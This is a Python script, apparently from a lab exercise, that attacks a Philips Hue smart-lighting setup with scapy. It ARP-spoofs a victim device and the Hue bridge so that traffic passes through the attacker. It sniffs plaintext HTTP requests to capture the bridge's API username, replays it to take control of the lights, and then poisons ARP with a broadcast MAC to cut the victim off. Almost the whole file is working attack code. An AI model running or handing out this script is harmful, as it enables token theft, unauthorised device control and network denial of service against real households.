import urllib3
import light_control as lc
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from scapy.layers.http import HTTPRequest
from scapy.sendrecv import sniff, srp, sendp

target_ip = "192.168.1.5" # IP address of the victim / user of the huestacean app
gateway_ip = "192.168.1.247" # IP address of the Philips Hue bridge
interface = "Wi-Fi" # Network interface to use
stop_sniffing = [False] # Used to stop the packet sniffer
stop_spoofing = [False] # Used to stop the ARP spoofing

# Disable SSL warnings, as we are not using any SSL certificates since we are in a safe and isolated environment
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def arp_spoof(target_ip, spoof_ip, interface):
    """
    Send an ARP spoofing packet to the target IP address.
    :param target_ip: IP address of the target
    :param spoof_ip: IP that we pretend is sending the packet
    :param interface: Network interface to use
    """
    target_mac = get_mac(target_ip)
    packet = Ether() / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=interface, verbose=False)


def arp_block(target_ip, gateway_ip, interface='Wi-Fi'):
    """
    Send an ARP spoofing packet that disconnects communication between target_ip and gateway_ip.
    :param target_ip: IP address of the target
    :param gateway_ip: IP address of the other target
    :param interface: Network interface to use
    """
    target_mac = get_mac(target_ip)
    packet = Ether() / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc="ff:ff:ff:ff:ff:ff")
    sendp(packet, iface=interface, verbose=False)


def get_mac(ip):
    """
    Get the MAC address of the device with the given IP address.
    :param ip: IP address of the device
    :return: MAC address of the device
    """
    response, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=2, retry=10, verbose=False)
    for _, packet in response:
        return packet[Ether].src


def sniff_packets(interface):
    """
    Sniff packets on the given interface and process them.
    :param interface: Network interface to use
    """
    def process_packet(packet):
        """
        Process a packet and check if it is the GET request to the Philips Hue bridge that we want.
        :param packet: Packet to process
        """
        if packet.haslayer(HTTPRequest):
            http_layer = packet[HTTPRequest]
            if http_layer.fields['Method'] == b'GET' and http_layer.fields['Path'][:5] == b'/api/' and len(
                    http_layer.fields['Path']) > 5:
                if http_layer.fields['Path'][5:6] != b'/':
                    print(f"Detected a GET request to {http_layer.fields['Host'].decode()}{http_layer.fields['Path'].decode()}")
                    initiate_rainbow(f"https://{gateway_ip}{http_layer.fields['Path'].decode()}")

    print("Starting packet sniffing...")
    sniff(iface=interface, store=False, prn=process_packet, filter="tcp port 80",
          stop_filter=lambda x: stop_sniffing[0])


def initiate_rainbow(url):
    """
    Initiate the light demo sequence on the Philips Hue bridge/lights.
    :param url: URL to send the requests to
    """
    time.sleep(60)
    lights = lc.retrieve_lights(url)
    lc.process_lights(url, lights)
    time.sleep(3)
    lc.turn_off_all_lights(url, lights, False)
    time.sleep(3)
    lc.turn_off_all_lights(url, lights, True)
    stop_spoofing[0] = True
    stop_sniffing[0] = True


def main():
    """
    Main function that starts the ARP spoofing and packet sniffing.
    """
    sniffer_thread = threading.Thread(target=sniff_packets, args=(interface,), daemon=True)
    sniffer_thread.start()
    try:
        while not stop_spoofing[0]:
            print("ARP spoofing started. Spoofing ARP requests...")
            arp_spoof(target_ip, gateway_ip, interface)
            arp_spoof(gateway_ip, target_ip, interface)
            time.sleep(10)
        while stop_spoofing[0]:
            print("ARP spoofing stopped. Blocking ARP requests...")
            arp_block(target_ip, gateway_ip, interface)
            arp_block(gateway_ip, target_ip, interface)
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("ARP spoofing stopped.")


if __name__ == "__main__":
    main()
